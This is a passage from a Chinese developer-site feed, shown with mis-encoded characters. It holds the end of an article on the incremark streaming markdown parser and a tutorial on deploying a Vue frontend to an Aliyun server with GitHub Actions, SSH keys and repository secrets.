   Time Saved: 84.8%
   Chars Saved: 98.0%
   Speedup: 18.58x

================================================================================
</code></pre>
<h2 data-id="heading-3">æ¡†æ¶æ”¯æŒ</h2>
<p>ç”±äºä»è§£æå±‚é¢ä¸Šå®ç°äº†æµå¼è§£æï¼Œå¹¶ä½¿ç”¨ mdast è¿›è¡Œè§£æç»“æœçš„è®°å½•ï¼Œå› æ­¤å½“å‰å·¥å…·å¾ˆå®¹æ˜“è¿ç§»åˆ°å„ç§æ¡†æ¶ä¸­ï¼Œç›®å‰å®ç°äº† vue ä¸ react ç‰ˆæœ¬ï¼Œsvelte ä¸ solid ç­‰å°ä¼—æ¡†æ¶å®ç°ä¹Ÿå¾ˆç®€å•ï¼ˆä½†æš‚æœªåšï¼‰ã€‚
vue demo åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-vue.vercel.app%2F" target="_blank" title="https://incremark-vue.vercel.app/" ref="nofollow noopener noreferrer">incremark-vue.vercel.app/</a>
react demo åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-react.vercel.app%2F" target="_blank" title="https://incremark-react.vercel.app/" ref="nofollow noopener noreferrer">incremark-react.vercel.app/</a></p>
<h2 data-id="heading-4">devtools</h2>
<p>é™¤äº†åŠŸèƒ½å®ç°ï¼Œè¿˜å¢åŠ äº† devtools å¯ä»¥æŸ¥çœ‹å½“å‰è§£æå†…å®¹çš„ä¸€äº›çŠ¶æ€</p>
<p><strong>markdown å†…å®¹ç»Ÿè®¡</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/550853d582b04d6a90a110942dd29153~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=FRy5uZPWQlKoR3DBkniTVayMfmA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>markdown å—ç»Ÿè®¡</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/561b83774eee4072b67cdc23a5d6a4d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=zFAmmBy2rh3%2BAAyCcXTRMnbZczA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>mdast ç»“æœ</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1be72d53785c47cead1a25813b4ba41c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=EXLNo1qZUBsL1v4vWRfz2TpOgVM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>chunk append è®°å½•</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f478452aa88f4965b35bca6e59eaabea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=AGkL2OutYLcw%2FvlpE7UKXbRKLh8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">deepwiki è§£ææ€§èƒ½æå‡åŸå› </h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/237e2492d01243e8b542a83f3c5ba054~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=X93lm6rRBGjpojEYbL9ojhVWaBE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">å°ç»“</h2>
<p>æ¬¢è¿å¤§å®¶ä½“éªŒï¼Œæ–‡æ¡£åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-docs.vercel.app%2Fzh%2F" target="_blank" title="https://incremark-docs.vercel.app/zh/" ref="nofollow noopener noreferrer">incremark-docs.vercel.app/zh/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¨æ ˆç³»åˆ—(15)github Actionsè‡ªåŠ¨åŒ–éƒ¨ç½²å‰ç«¯vue]]></title>    <link>https://juejin.cn/post/7583992239103180852</link>    <guid>https://juejin.cn/post/7583992239103180852</guid>    <pubDate>2025-12-16T06:13:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103180852" data-draft-id="7583992239103000628" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¨æ ˆç³»åˆ—(15)github Actionsè‡ªåŠ¨åŒ–éƒ¨ç½²å‰ç«¯vue "/> <meta itemprop="keywords" content="å‰ç«¯,GitHub,Node.js"/> <meta itemprop="datePublished" content="2025-12-16T06:13:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°èƒ–éœ"/> <meta itemprop="url" content="https://juejin.cn/user/3790771822016301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¨æ ˆç³»åˆ—(15)github Actionsè‡ªåŠ¨åŒ–éƒ¨ç½²å‰ç«¯vue 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3790771822016301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°èƒ–éœ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:13:08.000Z" title="Tue Dec 16 2025 06:13:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šå›½å†…å¼€å‘è€…éƒ½ä¼šé‡‡ç”¨Â  <strong>â€œGitee åšä»£ç æ‰˜ç®¡ï¼ˆé€Ÿåº¦å¿«ï¼‰ï¼ŒGitHub åšè‡ªåŠ¨åŒ–æ„å»ºï¼ˆåŠŸèƒ½å¼ºï¼‰â€</strong> Â çš„åŒä»“åº“ç­–ç•¥ã€‚</p>
<p>ä½ ä¸éœ€â€œæ‰‹åŠ¨å¤åˆ¶æ–‡ä»¶â€ï¼Œåªéœ€è¦åˆ©ç”¨ Git çš„Â <strong>å¤šè¿œç¨‹ä»“åº“ï¼ˆMultiple Remotesï¼‰</strong> Â åŠŸèƒ½ï¼Œå°±èƒ½åœ¨ä¸€ä¸ªæœ¬åœ°é¡¹ç›®ä¸­åŒæ—¶ç®¡ç†ä¸¤ä¸ªä»“åº“ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å®ç°è¿™ä¸€æ–¹æ¡ˆçš„æœ€ä½³å®è·µæ­¥éª¤ï¼š</p>
<h4 data-id="heading-0">ç¬¬ä¸€æ­¥ï¼šåœ¨ GitHub ä¸Šæ–°å»ºä»“åº“</h4>
<ol>
<li>ç™»å½• GitHubï¼Œåˆ›å»ºä¸€ä¸ªç©ºä»“åº“ï¼ˆå‡è®¾å«Â vue-admin-deployï¼‰ã€‚</li>
<li><strong>ä¸è¦</strong>å‹¾é€‰â€œInitialize this repository with a READMEâ€ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªçº¯ç©ºçš„ä»“åº“ã€‚</li>
</ol>
<h4 data-id="heading-1">ç¬¬äºŒæ­¥ï¼šæ·»åŠ  GitHub ä¸ºç¬¬äºŒä¸ªè¿œç¨‹ä»“åº“</h4>
<p>æ‰“å¼€ä½ çš„æœ¬åœ°é¡¹ç›®ç»ˆç«¯ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-js" lang="js"># <span class="hljs-number">1.</span> æŸ¥çœ‹å½“å‰çš„è¿œç¨‹ä»“åº“ï¼ˆåº”è¯¥åªæœ‰ giteeï¼‰
git remote -v
# è¾“å‡ºé€šå¸¸æ˜¯ï¼šorigin  <span class="hljs-attr">https</span>:<span class="hljs-comment">//gitee.com/ä½ çš„ç”¨æˆ·å/é¡¹ç›®å.git (fetch/push)</span>

# <span class="hljs-number">2.</span> æ·»åŠ  <span class="hljs-title class_">GitHub</span> ä¸ºç¬¬äºŒä¸ªè¿œç¨‹ä»“åº“ï¼Œå‘½åä¸º <span class="hljs-string">"github"</span>
git remote add github <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/ä½ çš„ç”¨æˆ·å/vue-admin-deploy.git</span>

# <span class="hljs-number">3.</span> å†æ¬¡æŸ¥çœ‹
git remote -v
# ç°åœ¨åº”è¯¥æœ‰ origin (<span class="hljs-title class_">Gitee</span>) å’Œ github (<span class="hljs-title class_">GitHub</span>) ä¸¤ä¸ªäº†


</code></pre>
<h4 data-id="heading-2">ç”Ÿæˆç§é’¥å’Œå…¬é’¥</h4>
<p>è¯·å®Œå…¨ç…§åšä¸€éï¼Œä¸è¦è·³è¿‡ä»»ä½•æ­¥éª¤ï¼š</p>
<h5 data-id="heading-3">ç¬¬ä¸€æ­¥ï¼šåœ¨æœ¬åœ°ç”µè„‘ç”Ÿæˆæ–°å¯†é’¥ï¼ˆPEMæ ¼å¼ï¼‰</h5>
<p>æ‰“å¼€ä½ çš„ç»ˆç«¯ï¼ˆGit Bash æˆ– CMDï¼‰ï¼Œæ‰§è¡Œè¿™æ¡å‘½ä»¤ç”Ÿæˆä¸€å¯¹æ–°é’¥åŒ™ï¼š</p>
<pre><code class="hljs language-js" lang="js"># -m <span class="hljs-variable constant_">PEM</span> æ˜¯å…³é”®ï¼å¼ºåˆ¶ç”Ÿæˆæ—§ç‰ˆå…¼å®¹æ ¼å¼ï¼Œé˜²æ­¢ <span class="hljs-title class_">Action</span> ä¸è¯†åˆ«
# -f gh_action_key æŒ‡å®šæ–‡ä»¶å
# -N <span class="hljs-string">""</span> è®¾ç½®ç©ºå¯†ç ï¼ˆå¿…é¡»ä¸ºç©ºï¼‰
ssh-keygen -t rsa -b <span class="hljs-number">4096</span> -m <span class="hljs-variable constant_">PEM</span> -f gh_action_key -N <span class="hljs-string">""</span>
</code></pre>
<p>æ‰§è¡Œåï¼Œä½ çš„å½“å‰ç›®å½•ä¸‹ä¼šæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼š</p>
<ol>
<li>gh_action_keyÂ (ç§é’¥ï¼Œæ²¡åç¼€)</li>
<li>gh_action_key.pubÂ (å…¬é’¥)</li>
</ol>
<h5 data-id="heading-4">ç¬¬äºŒæ­¥ï¼šæŠŠå…¬é’¥æ”¾åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨</h5>
<ol>
<li><strong>å¤åˆ¶å…¬é’¥å†…å®¹</strong>ï¼šæ‰“å¼€Â gh_action_key.pubï¼Œå¤åˆ¶é‡Œé¢çš„å…¨éƒ¨å†…å®¹ã€‚</li>
<li><strong>ç™»å½•æœåŠ¡å™¨</strong>ï¼šä½¿ç”¨ SSH ç™»å½•ä½ çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ã€‚</li>
<li>å†™å…¥æ–‡ä»¶ï¼šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆå‡è®¾ä½ æ˜¯ç”¨Â rootÂ ç”¨æˆ·éƒ¨ç½²ï¼Œå¦‚æœæ˜¯å…¶ä»–ç”¨æˆ·ï¼Œè¯·åˆ‡æ¢åˆ°å¯¹åº”ç”¨æˆ·ï¼‰</li>
<li/>
</ol>
<pre><code class="hljs language-js" lang="js"># è¿›å…¥ ssh ç›®å½•
cd ~/.<span class="hljs-property">ssh</span>

# æŠŠå…¬é’¥è¿½åŠ åˆ°æˆæƒæ–‡ä»¶ä¸­ï¼ˆæ³¨æ„æ˜¯ &gt;&gt; ä¹Ÿå°±æ˜¯è¿½åŠ ï¼‰
# æŒ‰ i è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œç²˜è´´å†…å®¹ï¼ŒæŒ‰ <span class="hljs-title class_">Esc</span>ï¼Œè¾“å…¥ :wq ä¿å­˜
vi authorized_keys
# æˆ–è€…ç›´æ¥ç”¨å‘½ä»¤è¿½åŠ ï¼ˆæŠŠä¸‹é¢åŒå¼•å·é‡Œçš„å†…å®¹æ¢æˆä½ åˆšæ‰å¤åˆ¶çš„å…¬é’¥ï¼‰
echo <span class="hljs-string">"ssh-rsa AAAAB3NzaC1yc2E..."</span> &gt;&gt; authorized_keys
</code></pre>
<p><strong>ä¿®å¤æƒé™ï¼ˆè‡³å…³é‡è¦ï¼ï¼ï¼ï¼‰</strong><br/>
æƒé™ä¸å¯¹ï¼ŒSSH ä¼šç›´æ¥æ‹’ç»ç™»å½•ï¼Œä¸ç®¡å¯†é’¥å¯¹ä¸å¯¹ã€‚è¯·åœ¨æœåŠ¡å™¨æ‰§è¡Œ</p>
<pre><code class="hljs language-js" lang="js">chmod <span class="hljs-number">700</span> ~/.<span class="hljs-property">ssh</span>
chmod <span class="hljs-number">600</span> ~<span class="hljs-regexp">/.ssh/</span>authorized_keys
</code></pre>
<h5 data-id="heading-5">ç¬¬ä¸‰æ­¥ï¼šæŠŠç§é’¥æ”¾åˆ° GitHub Secrets</h5>
<h4 data-id="heading-6">å¯†é’¥å‡†å¤‡ (Secrets)</h4>
<p>ä¸ºäº†å®‰å…¨ï¼Œä¸è¦å°†æœåŠ¡å™¨ IP å’Œç§é’¥æ˜æ–‡å†™åœ¨ä»£ç é‡Œã€‚åœ¨ GitHub ä»“åº“çš„Â <strong>Settings -&gt; Secrets and variables -&gt; Actions</strong>Â ä¸­æ·»åŠ ï¼š</p>
<ul>
<li>SERVER_IP: æœåŠ¡å™¨å…¬ç½‘ IPã€‚</li>
<li>SERVER_USER: ç™»å½•ç”¨æˆ·å (å¦‚ root)ã€‚</li>
<li>SERVER_SSH_KEY: SSH ç§é’¥ã€‚</li>
</ul>
<ol>
<li>
<p><strong>å¤åˆ¶ç§é’¥å†…å®¹</strong>ï¼šåœ¨æœ¬åœ°æ‰“å¼€Â gh_action_keyï¼ˆé‚£ä¸ªæ²¡åç¼€çš„æ–‡ä»¶ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å…¨é€‰å¤åˆ¶</strong>ï¼šå¿…é¡»åŒ…å«Â <code>-----BEGIN RSA PRIVATE KEY-----Â å’ŒÂ -----END RSA PRIVATE KEY-----</code>ã€‚</p>
</li>
<li>
<p><strong>å» GitHub</strong>ï¼š<code>Settings -&gt; Secrets and variables -&gt; Actions</code>ã€‚</p>
</li>
<li>
<p><strong>æ›´æ–° Secret</strong>ï¼š å» GitHub ä»“åº“é¡µé¢ -&gt;Â <strong>Settings</strong>Â -&gt;Â <strong>Secrets and variables</strong>Â -&gt;Â <strong>Actions</strong>ã€‚</p>
</li>
<li>
<p>æ·»åŠ Â SERVER_IP,Â SERVER_USER,Â SERVER_SSH_KEYã€‚</p>
</li>
<li>
<p>SERVER_IP: æœåŠ¡å™¨å…¬ç½‘IPï¼ŒSERVER_USERï¼šroot,SERVER_SSH_KEY:ä¸Šé¢ç”Ÿæˆçš„ç§é’¥</p>
</li>
</ol>
<h4 data-id="heading-7">é…ç½® GitHub Actions</h4>
<ol>
<li>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œæ–°å»ºæ–‡ä»¶å¤¹Â .github/workflows/ï¼ˆæ³¨æ„æ˜¯Â .githubÂ ä¸æ˜¯Â .giteeï¼‰ã€‚</li>
<li>æ–°å»ºæ–‡ä»¶Â deploy.ymlã€‚</li>
</ol>
<p>æ³¨æ„<code>node</code>ç‰ˆæœ¬ å’Œä½¿ç”¨çš„<code>npm</code>è¿˜æ˜¯<code>pnpm</code>,  <code>yml</code>ä¼šä¸ä¸€æ ·,æˆ‘ä½¿ç”¨çš„æ˜¯pnpmã€‚ä»¥åŠä½ çš„å‰ç«¯é¡¹ç›®æ˜¯æ”¾åˆ°æœåŠ¡å™¨å“ªä¸ªç›®å½•ä¸‹çš„ï¼Œæˆ‘çš„æ˜¯æ”¾åˆ°<code>/var/www/html/vue-admin-template/</code>,è¯·æ”¹æˆä½ è‡ªå·±çš„æœåŠ¡å™¨ç›®å½•</p>
<p>æ–‡ä»¶deploy.yml</p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Aliyun</span> <span class="hljs-string">(PNPM)</span>
<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span>

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build-and-deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>

      <span class="hljs-comment"># 1. æ ¸å¿ƒæ–°å¢ï¼šå®‰è£… PNPM</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">pnpm</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v2</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">version:</span> <span class="hljs-number">9</span> <span class="hljs-comment"># è¿™é‡Œå»ºè®®å†™ä½ æœ¬åœ°ä½¿ç”¨çš„ pnpm å¤§ç‰ˆæœ¬ (å¦‚ 8 æˆ– 9)</span>

      <span class="hljs-comment"># 2. ä¿®æ”¹ï¼šè®¾ç½® Node å¹¶å¼€å¯ pnpm ç¼“å­˜</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Node.js</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">node-version:</span> <span class="hljs-string">'22.13.0'</span> <span class="hljs-comment"># &lt;--- å…³é”®ä¿®æ”¹ï¼šè®¾ç½® Node.js ç‰ˆæœ¬</span>
          <span class="hljs-attr">cache:</span> <span class="hljs-string">'pnpm'</span> <span class="hljs-comment"># &lt;--- å…³é”®ä¿®æ”¹ï¼šå‘Šè¯‰å®ƒå»æ‰¾ pnpm-lock.yaml</span>

      <span class="hljs-comment"># 3. ä¿®æ”¹ï¼šä½¿ç”¨ pnpm å‘½ä»¤å®‰è£…å’Œæ‰“åŒ…</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">&amp;</span> <span class="hljs-string">Build</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">|
          node -v
          pnpm -v
          pnpm install --frozen-lockfile # ç±»ä¼¼ npm ciï¼Œä¸¥æ ¼æŒ‰ç…§ lock æ–‡ä»¶å®‰è£…
          pnpm run build
          ls -la dist/
</span>
      <span class="hljs-comment"># 4. ä¸Šä¼ æ–‡ä»¶ (ä¿æŒä¸å˜)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Server</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">appleboy/scp-action@master</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">host:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_IP</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">username:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">key:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">source:</span> <span class="hljs-string">'dist/*'</span>
          <span class="hljs-attr">target:</span> <span class="hljs-string">'/var/www/html/vue-admin-template/'</span>
          <span class="hljs-attr">strip_components:</span> <span class="hljs-number">1</span>

      <span class="hljs-comment"># 5. é‡å¯ Nginx (ä¿æŒä¸å˜)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Restart</span> <span class="hljs-string">Nginx</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">appleboy/ssh-action@master</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">host:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_IP</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">username:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">key:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">script:</span> <span class="hljs-string">|
            sudo chown -R www-data:www-data /var/www/html/vue-admin-template/
            sudo chmod -R 755 /var/www/html/vue-admin-template/
            echo "éƒ¨ç½²å®Œæˆï¼"
</span>
</code></pre>
<h4 data-id="heading-8">åŒæ­¥æ¨é€ä»£ç </h4>
<p>ä»¥åå†™å®Œä»£ç ï¼Œä½ éœ€è¦æ¨é€åˆ°ä¸¤ä¸ªåœ°æ–¹ã€‚</p>
<p><strong>æ–¹å¼ä¸€ï¼šåˆ†åˆ«æ¨é€ï¼ˆæ¸…æ™°æ˜äº†ï¼‰</strong></p>
<pre><code class="hljs language-js" lang="js"># å…ˆæ¨é€åˆ° <span class="hljs-title class_">Gitee</span>ï¼ˆæ—¥å¸¸ä¿å­˜ï¼‰
git push origin master

# å†æ¨é€åˆ° <span class="hljs-title class_">GitHub</span>ï¼ˆè§¦å‘éƒ¨ç½²ï¼‰
git push github master
</code></pre>
<p><strong>æ–¹å¼äºŒï¼šä¸€æ¡å‘½ä»¤æ¨é€åˆ°ä¸¤ä¸ªä»“åº“ï¼ˆæ‡’äººæ¨èï¼‰</strong><br/>
ä½ å¯ä»¥ä¿®æ”¹ git é…ç½®ï¼Œè®©Â originÂ åŒæ—¶æŒ‡å‘ä¸¤ä¸ªåœ°å€ï¼š</p>
<pre><code class="hljs language-js" lang="js"># ç»™ origin æ·»åŠ ç¬¬äºŒä¸ª push åœ°å€
git remote set-url --add --push origin <span class="hljs-attr">https</span>:<span class="hljs-comment">//gitee.com/ä½ çš„ç”¨æˆ·å/é¡¹ç›®å.git</span>
git remote set-url --add --push origin <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/ä½ çš„ç”¨æˆ·å/vue-admin-deploy.git</span>

# éªŒè¯
git remote -v

# ä»¥ååªéœ€è¦æ‰§è¡Œè¿™ä¸€æ¡ï¼Œå°±ä¼šåŒæ—¶æ¨é€åˆ° <span class="hljs-title class_">Gitee</span> å’Œ <span class="hljs-title class_">GitHub</span>
git push origin master
</code></pre>
<p>è¿™æ—¶å€™åœ¨masteråˆ†æ”¯æäº¤ä»£ç ï¼Œå»githubçš„Actionsä¸‹å»æŸ¥çœ‹éƒ¨ç½²æµç¨‹å°±okäº†ã€‚</p>
<h2 data-id="heading-9">å››ã€ æœåŠ¡å™¨é…ç½®ï¼šNginx åå‘ä»£ç†ä¸ 404 ä¿®å¤</h2>
